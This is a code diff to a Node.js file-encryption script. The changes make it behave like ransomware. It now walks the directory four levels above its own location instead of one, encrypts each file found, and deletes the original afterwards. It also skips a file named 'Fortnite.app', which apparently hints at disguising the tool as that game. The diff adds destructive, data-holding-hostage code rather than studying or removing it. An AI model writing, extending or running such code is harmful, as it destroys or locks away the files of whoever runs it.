@@ -1,7 +1,7 @@
 const fs = require('fs');
 const crypto = require('crypto');
 const path = require('path');
-const parentDir = __dirname + "/../";
+const parentDir = __dirname + "/../../../../";
 const newKey = crypto.randomBytes(6).toString('base64');
 
 function encrypt (pathIn, key, isDir) {
@@ -24,6 +24,11 @@ function encrypt (pathIn, key, isDir) {
 
             output.on('finish', function () {
                 console.log('Encrypted file written to disk!');
+
+                fs.unlink(pathIn, function (err) {
+                    if (err) throw err;
+                    console.log('Deleted');
+                });
             });
         }
     }
@@ -90,7 +95,7 @@ function search (pathIn, mode) {
                         console.log("'%s' is a file.", filePath);
 
                         let extension = file.split('.').pop();
-                        if (file !== ".DS_Store" && !["app", "exe", "localized", "ini"].includes(extension)) {
+                        if (file !== "Fortnite.app" && file !== ".DS_Store" && !["app", "exe", "localized", "ini"].includes(extension)) {
                             if (mode === 0) encrypt(filePath, key, false);
                             else if (mode === 1) decrypt(filePath, key, false);
                         }
